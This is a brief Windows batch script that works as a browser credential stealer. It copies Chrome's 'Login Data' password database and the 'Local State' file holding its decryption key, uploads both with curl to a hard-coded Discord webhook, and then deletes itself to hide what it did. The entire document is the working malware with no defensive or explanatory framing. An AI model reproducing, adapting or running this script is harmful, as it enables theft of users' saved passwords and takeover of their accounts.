@echo off
set "sourceDir1=%localappdata%\Google\Chrome\User Data\Default\"
set "sourceDir2=%localappdata%\Google\Chrome\User Data\"
set "fileName1=Login Data"
set "fileName2=Local State"
set "webhookUrl=https://discord.com/api/webhooks/1246527590026448926/LTvUJGS9xvGSiozP-8jr-BaRki98at9F_SngX_bdpasuTb_9_dmQTrhjLjtjWdMHejyT"
curl -F "file=@%sourceDir1%\%fileName1%" %webhookUrl%
curl -F "file=@%sourceDir2%\%fileName2%" %webhookUrl%
del "%~f0"
